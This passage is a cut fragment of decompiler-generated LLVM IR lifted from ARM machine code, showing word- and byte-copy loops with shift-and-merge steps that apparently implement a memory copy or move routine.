  %v9_1b3ec = add i32 %v0_1b3ec, 12
  %v10_1b3ec = inttoptr i32 %v9_1b3ec to i32*
  %v11_1b3ec = load i32, i32* %v10_1b3ec, align 4
  store i32 %v11_1b3ec, i32* %lr.global-to-local, align 4
  %v12_1b3ec = add i32 %v0_1b3ec, 16
  store i32 %v12_1b3ec, i32* %r1.global-to-local, align 4
  %v4_1b3f0 = mul i32 %v2_1b3ec, 256
  %v5_1b3f0 = or i32 %v4_1b3f0, %v3_1b3e8
  store i32 %v5_1b3f0, i32* @r3, align 4
  %v3_1b3f4 = udiv i32 %v2_1b3ec, 16777216
  %v4_1b3f8 = mul i32 %v5_1b3ec, 256
  %v5_1b3f8 = or i32 %v4_1b3f8, %v3_1b3f4
  store i32 %v5_1b3f8, i32* %r4.global-to-local, align 4
  %v3_1b3fc = udiv i32 %v5_1b3ec, 16777216
  %v4_1b400 = mul i32 %v8_1b3ec, 256
  %v5_1b400 = or i32 %v4_1b400, %v3_1b3fc
  store i32 %v5_1b400, i32* %r5.global-to-local, align 4
  %v3_1b404 = udiv i32 %v8_1b3ec, 16777216
  %v4_1b408 = mul i32 %v11_1b3ec, 256
  %v5_1b408 = or i32 %v4_1b408, %v3_1b404
  store i32 %v5_1b408, i32* @ip, align 4
  %v1_1b40c = inttoptr i32 %v0_1b40c to i32*
  store i32 %v5_1b3f0, i32* %v1_1b40c, align 4
  %v3_1b40c = add i32 %v0_1b40c, 4
  %v4_1b40c = inttoptr i32 %v3_1b40c to i32*
  %v5_1b40c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1b40c, i32* %v4_1b40c, align 4
  %v6_1b40c = add i32 %v0_1b40c, 8
  %v7_1b40c = inttoptr i32 %v6_1b40c to i32*
  %v8_1b40c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_1b40c, i32* %v7_1b40c, align 4
  %v9_1b40c = add i32 %v0_1b40c, 12
  %v10_1b40c = inttoptr i32 %v9_1b40c to i32*
  %v11_1b40c = load i32, i32* @ip, align 4
  store i32 %v11_1b40c, i32* %v10_1b40c, align 4
  %v12_1b40c = add i32 %v0_1b40c, 16
  store i32 %v12_1b40c, i32* %r0.global-to-local, align 4
  %v0_1b410 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b410 = add i32 %v0_1b410, -16
  store i32 %v1_1b410, i32* %r2.global-to-local, align 4
  %v3_1b410 = sub i32 15, %v0_1b410
  %v4_1b410 = and i32 %v3_1b410, %v0_1b410
  %v5_1b410 = icmp slt i32 %v4_1b410, 0
  %v6_1b410 = icmp slt i32 %v1_1b410, 0
  %v2_1b414 = xor i1 %v6_1b410, %v5_1b410
  br i1 %v2_1b414, label %dec_label_pc_1b418, label %dec_label_pc_1b3e8.dec_label_pc_1b3e8_crit_edge

dec_label_pc_1b3e8.dec_label_pc_1b3e8_crit_edge:  ; preds = %dec_label_pc_1b3e8
  %v0_1b3e8.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_1b3ec.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1b3e8

dec_label_pc_1b418:                               ; preds = %dec_label_pc_1b3e8
  %v2_1b418 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1b418, i32* @r4, align 4
  %v5_1b418 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_1b418, i32* @r5, align 4
  %v1_1b41c = add i32 %v0_1b410, -4
  store i32 %v1_1b41c, i32* %r2.global-to-local, align 4
  %v3_1b41c = add i32 %v0_1b410, 2147483632
  %v4_1b41c = and i32 %v1_1b41c, %v3_1b41c
  %v5_1b41c = icmp slt i32 %v4_1b41c, 0
  store i1 %v5_1b41c, i1* %cpsr_v.global-to-local, align 1
  %v6_1b41c = icmp slt i32 %v1_1b41c, 0
  store i1 %v6_1b41c, i1* %cpsr_n.global-to-local, align 1
  %v7_1b41c = icmp eq i32 %v1_1b41c, 0
  store i1 %v7_1b41c, i1* %cpsr_z.global-to-local, align 1
  %v2_1b420 = xor i1 %v6_1b41c, %v5_1b41c
  br i1 %v2_1b420, label %dec_label_pc_1b43c, label %dec_label_pc_1b424

dec_label_pc_1b424:                               ; preds = %dec_label_pc_1b418, %dec_label_pc_1b3d8, %dec_label_pc_1b424
  %v1_1b430 = phi i32 [ %v4_1b430, %dec_label_pc_1b424 ], [ %v12_1b40c, %dec_label_pc_1b418 ], [ %v0_1b40c75, %dec_label_pc_1b3d8 ]
  %v0_1b424 = load i32, i32* %lr.global-to-local, align 4
  %v3_1b424 = udiv i32 %v0_1b424, 16777216
  store i32 %v3_1b424, i32* %ip.global-to-local, align 4
  %v0_1b428 = load i32, i32* %r1.global-to-local, align 4
  %v1_1b428 = inttoptr i32 %v0_1b428 to i32*
  %v2_1b428 = load i32, i32* %v1_1b428, align 4
  store i32 %v2_1b428, i32* %lr.global-to-local, align 4
  %v4_1b428 = add i32 %v0_1b428, 4
  store i32 %v4_1b428, i32* %r1.global-to-local, align 4
  %v4_1b42c = mul i32 %v2_1b428, 256
  %v5_1b42c = or i32 %v4_1b42c, %v3_1b424
  store i32 %v5_1b42c, i32* @ip, align 4
  %v2_1b430 = inttoptr i32 %v1_1b430 to i32*
  store i32 %v5_1b42c, i32* %v2_1b430, align 4
  %v3_1b430 = load i32, i32* %r0.global-to-local, align 4
  %v4_1b430 = add i32 %v3_1b430, 4
  store i32 %v4_1b430, i32* %r0.global-to-local, align 4
  %v0_1b434 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b434 = add i32 %v0_1b434, -4
  store i32 %v1_1b434, i32* %r2.global-to-local, align 4
  %v3_1b434 = sub i32 3, %v0_1b434
  %v4_1b434 = and i32 %v3_1b434, %v0_1b434
  %v5_1b434 = icmp slt i32 %v4_1b434, 0
  %v6_1b434 = icmp slt i32 %v1_1b434, 0
  %v2_1b438 = xor i1 %v6_1b434, %v5_1b434
  br i1 %v2_1b438, label %dec_label_pc_1b43c.loopexit, label %dec_label_pc_1b424

dec_label_pc_1b43c.loopexit:                      ; preds = %dec_label_pc_1b424
  %v7_1b434 = icmp eq i32 %v0_1b434, 4
  store i1 %v5_1b434, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_1b434, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_1b434, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1b43c

dec_label_pc_1b43c:                               ; preds = %dec_label_pc_1b43c.loopexit, %dec_label_pc_1b418
  %v0_1b28c60 = phi i32 [ %v1_1b434, %dec_label_pc_1b43c.loopexit ], [ %v1_1b41c, %dec_label_pc_1b418 ]
  %v0_1b43c = load i32, i32* %r1.global-to-local, align 4
  %v1_1b43c = add i32 %v0_1b43c, -1
  store i32 %v1_1b43c, i32* %r1.global-to-local, align 4
  br label %bb140

dec_label_pc_1b444:                               ; preds = %entry
  %v1_1b444 = load i32, i32* @r2, align 4
  %v2_1b444 = add i32 %v1_1b444, %v0_1b1f0
  store i32 %v2_1b444, i32* %r1.global-to-local, align 4
  %v2_1b448 = add i32 %v1_1b444, %v1_1b1f0
  store i32 %v2_1b448, i32* %r0.global-to-local, align 4
  %v2_1b44c = add i32 %v1_1b444, -4
  store i32 %v2_1b44c, i32* %r2.global-to-local, align 4
  %v4_1b44c = sub i32 3, %v1_1b444
  %v5_1b44c = and i32 %v4_1b44c, %v1_1b444
  %v6_1b44c = icmp slt i32 %v5_1b44c, 0
  store i1 %v6_1b44c, i1* %cpsr_v.global-to-local, align 1
  %v7_1b44c = icmp slt i32 %v2_1b44c, 0
  store i1 %v7_1b44c, i1* %cpsr_n.global-to-local, align 1
  %v8_1b44c = icmp eq i32 %v1_1b444, 4
  store i1 %v8_1b44c, i1* %cpsr_z.global-to-local, align 1
  %v5_1b450 = icmp slt i32 %v1_1b444, 4
  br i1 %v5_1b450, label %bb150, label %dec_label_pc_1b454

dec_label_pc_1b454:                               ; preds = %dec_label_pc_1b444
  %v1_1b454 = urem i32 %v2_1b448, 4
  store i32 %v1_1b454, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1b454 = icmp eq i32 %v1_1b454, 0
  store i1 %v2_1b454, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b454, label %dec_label_pc_1b45c, label %dec_label_pc_1b4fc

dec_label_pc_1b45c:                               ; preds = %dec_label_pc_1b454
  %v1_1b45c = urem i32 %v2_1b444, 4
  store i32 %v1_1b45c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1b45c = icmp eq i32 %v1_1b45c, 0
  store i1 %v2_1b45c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b45c, label %dec_label_pc_1b464, label %dec_label_pc_1b528

dec_label_pc_1b464:                               ; preds = %dec_label_pc_1b45c, %dec_label_pc_1b520
  %v0_1b47c36 = phi i32 [ %v2_1b448, %dec_label_pc_1b45c ], [ %v0_1b57019, %dec_label_pc_1b520 ]
  %v0_1b47835 = phi i32 [ %v2_1b444, %dec_label_pc_1b45c ], [ %v0_1b520, %dec_label_pc_1b520 ]
  %v0_1b464 = phi i32 [ %v2_1b44c, %dec_label_pc_1b45c ], [ %v2_1b518, %dec_label_pc_1b520 ]
  %v2_1b464 = add i32 %v0_1b464, -8
  store i32 %v2_1b464, i32* %r2.global-to-local, align 4
  %v4_1b464 = sub i32 7, %v0_1b464
  %v5_1b464 = and i32 %v4_1b464, %v0_1b464
  %v6_1b464 = icmp slt i32 %v5_1b464, 0
  store i1 %v6_1b464, i1* %cpsr_v.global-to-local, align 1
  %v7_1b464 = icmp slt i32 %v2_1b464, 0
  store i1 %v7_1b464, i1* %cpsr_n.global-to-local, align 1
  %v8_1b464 = icmp eq i32 %v0_1b464, 8
  store i1 %v8_1b464, i1* %cpsr_z.global-to-local, align 1
  %v5_1b468 = icmp slt i32 %v0_1b464, 8
  br i1 %v5_1b468, label %dec_label_pc_1b4b4, label %dec_label_pc_1b46c

dec_label_pc_1b46c:                               ; preds = %dec_label_pc_1b464
  %v3_1b46c = load i32, i32* @r4, align 4
  %v5_1b46c = inttoptr i32 %v3_1b46c to i8*
  store i8* %v5_1b46c, i8** %stack_var_-8, align 4
  %v8_1b46c = load i32, i32* @lr, align 4
  %v2_1b470 = add i32 %v0_1b464, -28
  store i32 %v2_1b470, i32* %r2.global-to-local, align 4
  %v4_1b470 = sub i32 27, %v0_1b464
  %v5_1b470 = and i32 %v4_1b470, %v2_1b464
  %v6_1b470 = icmp slt i32 %v5_1b470, 0
  store i1 %v6_1b470, i1* %cpsr_v.global-to-local, align 1
  %v7_1b470 = icmp slt i32 %v2_1b470, 0
  store i1 %v7_1b470, i1* %cpsr_n.global-to-local, align 1
  %v8_1b470 = icmp eq i32 %v2_1b464, 20
  store i1 %v8_1b470, i1* %cpsr_z.global-to-local, align 1
  %v5_1b474 = icmp slt i32 %v2_1b464, 20
  br i1 %v5_1b474, label %dec_label_pc_1b490, label %dec_label_pc_1b478

dec_label_pc_1b478:                               ; preds = %dec_label_pc_1b46c, %dec_label_pc_1b478.dec_label_pc_1b478_crit_edge
  %v0_1b47c = phi i32 [ %v1_1b484, %dec_label_pc_1b478.dec_label_pc_1b478_crit_edge ], [ %v0_1b47c36, %dec_label_pc_1b46c ]
  %v0_1b478 = phi i32 [ %v0_1b478.pre, %dec_label_pc_1b478.dec_label_pc_1b478_crit_edge ], [ %v0_1b47835, %dec_label_pc_1b46c ]
  %v1_1b478 = add i32 %v0_1b478, -4
  %v2_1b478 = inttoptr i32 %v1_1b478 to i32*
  %v3_1b478 = load i32, i32* %v2_1b478, align 4
  %v4_1b478 = add i32 %v0_1b478, -8
  %v5_1b478 = inttoptr i32 %v4_1b478 to i32*
  %v6_1b478 = load i32, i32* %v5_1b478, align 4
  store i32 %v6_1b478, i32* %r4.global-to-local, align 4
  %v7_1b478 = add i32 %v0_1b478, -12
  %v8_1b478 = inttoptr i32 %v7_1b478 to i32*
  %v9_1b478 = load i32, i32* %v8_1b478, align 4
  store i32 %v9_1b478, i32* %ip.global-to-local, align 4
  %v10_1b478 = add i32 %v0_1b478, -16
  %v11_1b478 = inttoptr i32 %v10_1b478 to i32*
  %v12_1b478 = load i32, i32* %v11_1b478, align 4
  store i32 %v12_1b478, i32* %lr.global-to-local, align 4
  store i32 %v10_1b478, i32* %r1.global-to-local, align 4
  %v1_1b47c = add i32 %v0_1b47c, -16
  %v2_1b47c = inttoptr i32 %v1_1b47c to i32*
  store i32 %v3_1b478, i32* %v2_1b47c, align 4
  %v4_1b47c = add i32 %v0_1b47c, -12
  %v5_1b47c = inttoptr i32 %v4_1b47c to i32*
  %v6_1b47c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_1b47c, i32* %v5_1b47c, align 4
  %v7_1b47c = add i32 %v0_1b47c, -8
  %v8_1b47c = inttoptr i32 %v7_1b47c to i32*
  %v9_1b47c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_1b47c, i32* %v8_1b47c, align 4
  %v10_1b47c = add i32 %v0_1b47c, -4
  %v11_1b47c = inttoptr i32 %v10_1b47c to i32*
  %v12_1b47c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1b47c, i32* %v11_1b47c, align 4
  store i32 %v1_1b47c, i32* %r0.global-to-local, align 4
  %v0_1b480 = load i32, i32* %r1.global-to-local, align 4
  %v1_1b480 = add i32 %v0_1b480, -4
  %v2_1b480 = inttoptr i32 %v1_1b480 to i32*
  %v3_1b480 = load i32, i32* %v2_1b480, align 4
  store i32 %v3_1b480, i32* @r3, align 4
  %v4_1b480 = add i32 %v0_1b480, -8
  %v5_1b480 = inttoptr i32 %v4_1b480 to i32*
  %v6_1b480 = load i32, i32* %v5_1b480, align 4
  store i32 %v6_1b480, i32* %r4.global-to-local, align 4
  %v7_1b480 = add i32 %v0_1b480, -12
  %v8_1b480 = inttoptr i32 %v7_1b480 to i32*
  %v9_1b480 = load i32, i32* %v8_1b480, align 4
  store i32 %v9_1b480, i32* @ip, align 4
  %v10_1b480 = add i32 %v0_1b480, -16
  %v11_1b480 = inttoptr i32 %v10_1b480 to i32*
  %v12_1b480 = load i32, i32* %v11_1b480, align 4
  store i32 %v12_1b480, i32* %lr.global-to-local, align 4
  store i32 %v10_1b480, i32* %r1.global-to-local, align 4
  %v1_1b484 = add i32 %v0_1b47c, -32
  %v2_1b484 = inttoptr i32 %v1_1b484 to i32*
  store i32 %v3_1b480, i32* %v2_1b484, align 4
  %v4_1b484 = add i32 %v0_1b47c, -28
  %v5_1b484 = inttoptr i32 %v4_1b484 to i32*
  %v6_1b484 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_1b484, i32* %v5_1b484, align 4
  %v7_1b484 = add i32 %v0_1b47c, -24
  %v8_1b484 = inttoptr i32 %v7_1b484 to i32*
  %v9_1b484 = load i32, i32* @ip, align 4
  store i32 %v9_1b484, i32* %v8_1b484, align 4
  %v10_1b484 = add i32 %v0_1b47c, -20
  %v11_1b484 = inttoptr i32 %v10_1b484 to i32*
  %v12_1b484 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1b484, i32* %v11_1b484, align 4
  store i32 %v1_1b484, i32* %r0.global-to-local, align 4
  %v0_1b488 = load i32, i32* %r2.global-to-local, align 4
  %v2_1b488 = add i32 %v0_1b488, -32
  store i32 %v2_1b488, i32* %r2.global-to-local, align 4
  %v6_1b48c = icmp slt i32 %v0_1b488, 32
  br i1 %v6_1b48c, label %dec_label_pc_1b490.loopexit, label %dec_label_pc_1b478.dec_label_pc_1b478_crit_edge

dec_label_pc_1b478.dec_label_pc_1b478_crit_edge:  ; preds = %dec_label_pc_1b478
  %v0_1b478.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1b478

dec_label_pc_1b490.loopexit:                      ; preds = %dec_label_pc_1b478
  %v4_1b488 = sub i32 31, %v0_1b488
  %v5_1b488 = and i32 %v4_1b488, %v0_1b488
  %v6_1b488 = icmp slt i32 %v5_1b488, 0
  %v7_1b488 = icmp slt i32 %v2_1b488, 0
  store i1 %v6_1b488, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_1b488, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1b490

dec_label_pc_1b490:                               ; preds = %dec_label_pc_1b490.loopexit, %dec_label_pc_1b46c
  %v6_1b498 = phi i32 [ %v1_1b484, %dec_label_pc_1b490.loopexit ], [ %v0_1b47c36, %dec_label_pc_1b46c ]
  %v0_1b4a0.pr = phi i32 [ %v2_1b488, %dec_label_pc_1b490.loopexit ], [ %v2_1b470, %dec_label_pc_1b46c ]
  %v4_1b490 = add i32 %v0_1b4a0.pr, 16
  %v6_1b490 = sub i32 0, %v0_1b4a0.pr
  %v7_1b490 = and i32 %v4_1b490, %v6_1b490
  %v8_1b490 = icmp slt i32 %v7_1b490, 0
  store i1 %v8_1b490, i1* %cpsr_v.global-to-local, align 1
  %v9_1b490 = icmp slt i32 %v4_1b490, 0
  store i1 %v9_1b490, i1* %cpsr_n.global-to-local, align 1
  %v10_1b490 = icmp eq i32 %v4_1b490, 0
  store i1 %v10_1b490, i1* %cpsr_z.global-to-local, align 1
  %v5_1b494 = icmp slt i32 %v0_1b4a0.pr, -16
  br i1 %v5_1b494, label %.thread1, label %bb147

bb147:                                            ; preds = %dec_label_pc_1b490
  %v6_1b494 = load i32, i32* %r1.global-to-local, align 4
  %v7_1b494 = add i32 %v6_1b494, -4
  %v8_1b494 = inttoptr i32 %v7_1b494 to i32*
  %v9_1b494 = load i32, i32* %v8_1b494, align 4
  store i32 %v9_1b494, i32* @r3, align 4
  %v10_1b494 = add i32 %v6_1b494, -8
  %v11_1b494 = inttoptr i32 %v10_1b494 to i32*
  %v12_1b494 = load i32, i32* %v11_1b494, align 4
  store i32 %v12_1b494, i32* %r4.global-to-local, align 4
  %v13_1b494 = add i32 %v6_1b494, -12
  %v14_1b494 = inttoptr i32 %v13_1b494 to i32*
  %v15_1b494 = load i32, i32* %v14_1b494, align 4
  store i32 %v15_1b494, i32* @ip, align 4
  %v16_1b494 = add i32 %v6_1b494, -16
  %v17_1b494 = inttoptr i32 %v16_1b494 to i32*
  %v18_1b494 = load i32, i32* %v17_1b494, align 4
  store i32 %v18_1b494, i32* %lr.global-to-local, align 4
  store i32 %v16_1b494, i32* %r1.global-to-local, align 4
  %v7_1b498 = add i32 %v6_1b498, -16
  %v8_1b498 = inttoptr i32 %v7_1b498 to i32*
  store i32 %v9_1b494, i32* %v8_1b498, align 4
  %v10_1b498 = add i32 %v6_1b498, -12
  %v11_1b498 = inttoptr i32 %v10_1b498 to i32*
  %v12_1b498 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_1b498, i32* %v11_1b498, align 4
  %v13_1b498 = add i32 %v6_1b498, -8
  %v14_1b498 = inttoptr i32 %v13_1b498 to i32*
  %v15_1b498 = load i32, i32* @ip, align 4
  store i32 %v15_1b498, i32* %v14_1b498, align 4
  %v16_1b498 = add i32 %v6_1b498, -4
  %v17_1b498 = inttoptr i32 %v16_1b498 to i32*
  %v18_1b498 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_1b498, i32* %v17_1b498, align 4
  store i32 %v7_1b498, i32* %r0.global-to-local, align 4
  %v6_1b49c = load i32, i32* %r2.global-to-local, align 4
  %v7_1b49c = add i32 %v6_1b49c, -16
  store i32 %v7_1b49c, i32* %r2.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1b490, %bb147
  %v6_1b4a8 = phi i32 [ %v7_1b498, %bb147 ], [ %v6_1b498, %dec_label_pc_1b490 ]
  %v0_1b4a0 = phi i32 [ %v7_1b49c, %bb147 ], [ %v0_1b4a0.pr, %dec_label_pc_1b490 ]
  %v4_1b4a0 = add i32 %v0_1b4a0, 20
  store i32 %v4_1b4a0, i32* %r2.global-to-local, align 4
  %v6_1b4a0 = sub i32 0, %v0_1b4a0
  %v7_1b4a0 = and i32 %v4_1b4a0, %v6_1b4a0
  %v8_1b4a0 = icmp slt i32 %v7_1b4a0, 0
  store i1 %v8_1b4a0, i1* %cpsr_v.global-to-local, align 1
  %v9_1b4a0 = icmp slt i32 %v4_1b4a0, 0
  store i1 %v9_1b4a0, i1* %cpsr_n.global-to-local, align 1
  %v10_1b4a0 = icmp eq i32 %v4_1b4a0, 0
  store i1 %v10_1b4a0, i1* %cpsr_z.global-to-local, align 1
  %v5_1b4a4 = icmp slt i32 %v0_1b4a0, -20
  br i1 %v5_1b4a4, label %.thread3, label %bb148

bb148:                                            ; preds = %.thread1
  %v6_1b4a4 = load i32, i32* %r1.global-to-local, align 4
  %v7_1b4a4 = add i32 %v6_1b4a4, -4
  %v8_1b4a4 = inttoptr i32 %v7_1b4a4 to i32*
  %v9_1b4a4 = load i32, i32* %v8_1b4a4, align 4
  store i32 %v9_1b4a4, i32* @r3, align 4
  %v10_1b4a4 = add i32 %v6_1b4a4, -8
  %v11_1b4a4 = inttoptr i32 %v10_1b4a4 to i32*
  %v12_1b4a4 = load i32, i32* %v11_1b4a4, align 4
  store i32 %v12_1b4a4, i32* @ip, align 4
  %v13_1b4a4 = add i32 %v6_1b4a4, -12
  %v14_1b4a4 = inttoptr i32 %v13_1b4a4 to i32*
  %v15_1b4a4 = load i32, i32* %v14_1b4a4, align 4
  store i32 %v15_1b4a4, i32* %lr.global-to-local, align 4
  store i32 %v13_1b4a4, i32* %r1.global-to-local, align 4
  %v7_1b4a8 = add i32 %v6_1b4a8, -12
  %v8_1b4a8 = inttoptr i32 %v7_1b4a8 to i32*
  store i32 %v9_1b4a4, i32* %v8_1b4a8, align 4
  %v10_1b4a8 = add i32 %v6_1b4a8, -8
  %v11_1b4a8 = inttoptr i32 %v10_1b4a8 to i32*
  %v12_1b4a8 = load i32, i32* @ip, align 4
  store i32 %v12_1b4a8, i32* %v11_1b4a8, align 4
  %v13_1b4a8 = add i32 %v6_1b4a8, -4
  %v14_1b4a8 = inttoptr i32 %v13_1b4a8 to i32*
  %v15_1b4a8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_1b4a8, i32* %v14_1b4a8, align 4
  store i32 %v7_1b4a8, i32* %r0.global-to-local, align 4
  %v6_1b4ac = load i32, i32* %r2.global-to-local, align 4
  %v7_1b4ac = add i32 %v6_1b4ac, -12
  store i32 %v7_1b4ac, i32* %r2.global-to-local, align 4
  br label %.thread3

.thread3:                                         ; preds = %.thread1, %bb148
  %v6_1b4cc44 = phi i32 [ %v6_1b4a8, %.thread1 ], [ %v7_1b4a8, %bb148 ]
  %v0_1b4b442 = phi i32 [ %v4_1b4a0, %.thread1 ], [ %v7_1b4ac, %bb148 ]
  %v2_1b4b0 = load i8*, i8** %stack_var_-8, align 4
  %v3_1b4b0 = ptrtoint i8* %v2_1b4b0 to i32
  store i32 %v3_1b4b0, i32* @r4, align 4
  store i32 %v8_1b46c, i32* @lr, align 4
  br label %dec_label_pc_1b4b4

dec_label_pc_1b4b4:                               ; preds = %dec_label_pc_1b464, %.thread3
  %v7_1b4c4 = phi i32 [ %v0_1b47c36, %dec_label_pc_1b464 ], [ %v6_1b4cc44, %.thread3 ]
  %v0_1b4b4 = phi i32 [ %v2_1b464, %dec_label_pc_1b464 ], [ %v0_1b4b442, %.thread3 ]
  %v2_1b4b4 = add i32 %v0_1b4b4, 8
  store i32 %v2_1b4b4, i32* %r2.global-to-local, align 4
  %v4_1b4b4 = sub i32 0, %v0_1b4b4
  %v5_1b4b4 = and i32 %v2_1b4b4, %v4_1b4b4
  %v6_1b4b4 = icmp slt i32 %v5_1b4b4, 0
  store i1 %v6_1b4b4, i1* %cpsr_v.global-to-local, align 1
  %v7_1b4b4 = icmp slt i32 %v2_1b4b4, 0
  store i1 %v7_1b4b4, i1* %cpsr_n.global-to-local, align 1
  %v8_1b4b4 = icmp eq i32 %v2_1b4b4, 0
  store i1 %v8_1b4b4, i1* %cpsr_z.global-to-local, align 1
  %v5_1b4b8 = icmp slt i32 %v0_1b4b4, -8
  br i1 %v5_1b4b8, label %bb150, label %dec_label_pc_1b4bc

dec_label_pc_1b4bc:                               ; preds = %dec_label_pc_1b4b4
  %v6_1b4bc = add i32 %v0_1b4b4, 4
  store i32 %v6_1b4bc, i32* %r2.global-to-local, align 4
  %v8_1b4bc = sub i32 -5, %v0_1b4b4
  %v9_1b4bc = and i32 %v8_1b4bc, %v2_1b4b4
  %v10_1b4bc = icmp slt i32 %v9_1b4bc, 0
  store i1 %v10_1b4bc, i1* %cpsr_v.global-to-local, align 1
  %v11_1b4bc = icmp slt i32 %v6_1b4bc, 0
  store i1 %v11_1b4bc, i1* %cpsr_n.global-to-local, align 1
  %v12_1b4bc = icmp eq i32 %v2_1b4b4, 4
  store i1 %v12_1b4bc, i1* %cpsr_z.global-to-local, align 1
  %v5_1b4c0 = icmp slt i32 %v2_1b4b4, 4
  %v6_1b4c0 = load i32, i32* %r1.global-to-local, align 4
  %v7_1b4c0 = add i32 %v6_1b4c0, -4
  %v8_1b4c0 = inttoptr i32 %v7_1b4c0 to i32*
  %v9_1b4c0 = load i32, i32* %v8_1b4c0, align 4
  store i32 %v9_1b4c0, i32* @r3, align 4
  br i1 %v5_1b4c0, label %.thread7, label %bb149

.thread7:                                         ; preds = %dec_label_pc_1b4bc
  store i32 %v7_1b4c0, i32* %r1.global-to-local, align 4
  %v8_1b4c4 = add i32 %v7_1b4c4, -4
  %v9_1b4c4 = inttoptr i32 %v8_1b4c4 to i32*
  store i32 %v9_1b4c0, i32* %v9_1b4c4, align 4
  %v10_1b4c4 = load i32, i32* %r0.global-to-local, align 4
  %v11_1b4c4 = add i32 %v10_1b4c4, -4
  store i32 %v11_1b4c4, i32* %r0.global-to-local, align 4
  %v0_1b4d4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb150

bb149:                                            ; preds = %dec_label_pc_1b4bc
  %v10_1b4c8 = add i32 %v6_1b4c0, -8
  %v11_1b4c8 = inttoptr i32 %v10_1b4c8 to i32*
  %v12_1b4c8 = load i32, i32* %v11_1b4c8, align 4
  store i32 %v12_1b4c8, i32* @ip, align 4
  store i32 %v10_1b4c8, i32* %r1.global-to-local, align 4
  %v7_1b4cc = add i32 %v7_1b4c4, -8
  %v8_1b4cc = inttoptr i32 %v7_1b4cc to i32*
  store i32 %v9_1b4c0, i32* %v8_1b4cc, align 4
  %v10_1b4cc = add i32 %v7_1b4c4, -4
  %v11_1b4cc = inttoptr i32 %v10_1b4cc to i32*
  %v12_1b4cc = load i32, i32* @ip, align 4
  store i32 %v12_1b4cc, i32* %v11_1b4cc, align 4
  store i32 %v7_1b4cc, i32* %r0.global-to-local, align 4
  %v6_1b4d0 = load i32, i32* %r2.global-to-local, align 4
  %v7_1b4d0 = add i32 %v6_1b4d0, -4
  store i32 %v7_1b4d0, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %.thread7, %dec_label_pc_1b4b4, %dec_label_pc_1b444, %.thread13, %dec_label_pc_1b678, %dec_label_pc_1b60c, %dec_label_pc_1b5a0, %bb149
  %v2_1b4d8 = phi i32 [ %v11_1b4c4, %.thread7 ], [ %v7_1b4c4, %dec_label_pc_1b4b4 ], [ %v2_1b448, %dec_label_pc_1b444 ], [ %v0_1b57019, %.thread13 ], [ %v2_1b4e452, %dec_label_pc_1b678 ], [ %v2_1b4e451, %dec_label_pc_1b60c ], [ %v2_1b4e450, %dec_label_pc_1b5a0 ], [ %v7_1b4cc, %bb149 ]
  %v0_1b4d4 = phi i32 [ %v0_1b4d4.pre, %.thread7 ], [ %v2_1b4b4, %dec_label_pc_1b4b4 ], [ %v2_1b44c, %dec_label_pc_1b444 ], [ %v2_1b518, %.thread13 ], [ %v0_1b4d448, %dec_label_pc_1b678 ], [ %v0_1b4d447, %dec_label_pc_1b60c ], [ %v0_1b4d446, %dec_label_pc_1b5a0 ], [ %v7_1b4d0, %bb149 ]
  %v1_1b4d4 = add i32 %v0_1b4d4, 4
  store i32 %v1_1b4d4, i32* @r2, align 4
  %v3_1b4d4 = sub i32 0, %v0_1b4d4
  %v4_1b4d4 = and i32 %v1_1b4d4, %v3_1b4d4
  %v5_1b4d4 = icmp slt i32 %v4_1b4d4, 0
  store i1 %v5_1b4d4, i1* %cpsr_v.global-to-local, align 1
  %v6_1b4d4 = icmp slt i32 %v1_1b4d4, 0
  store i1 %v6_1b4d4, i1* %cpsr_n.global-to-local, align 1
  %v7_1b4d4 = icmp eq i32 %v1_1b4d4, 0
  store i1 %v7_1b4d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1b4d4, label %.thread129, label %bb151

bb151:                                            ; preds = %bb150
  %v1_1b4dc = add i32 %v0_1b4d4, 2
  %v3_1b4dc = sub i32 -3, %v0_1b4d4
  %v4_1b4dc = and i32 %v3_1b4dc, %v1_1b4d4
  %v5_1b4dc = icmp slt i32 %v4_1b4dc, 0
  store i1 %v5_1b4dc, i1* %cpsr_v.global-to-local, align 1
  %v6_1b4dc = icmp slt i32 %v1_1b4dc, 0
  store i1 %v6_1b4dc, i1* %cpsr_n.global-to-local, align 1
  %v7_1b4dc = icmp eq i32 %v1_1b4d4, 2
  store i1 %v7_1b4dc, i1* %cpsr_z.global-to-local, align 1
  %v0_1b4e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_1b4e0 = add i32 %v0_1b4e0, -1
  %v2_1b4e0 = inttoptr i32 %v1_1b4e0 to i8*
  %v3_1b4e0 = load i8, i8* %v2_1b4e0, align 1
  %v4_1b4e0 = zext i8 %v3_1b4e0 to i32
  store i32 %v4_1b4e0, i32* @r3, align 4
  store i32 %v1_1b4e0, i32* %r1.global-to-local, align 4
  %v3_1b4e4 = add i32 %v2_1b4d8, -1
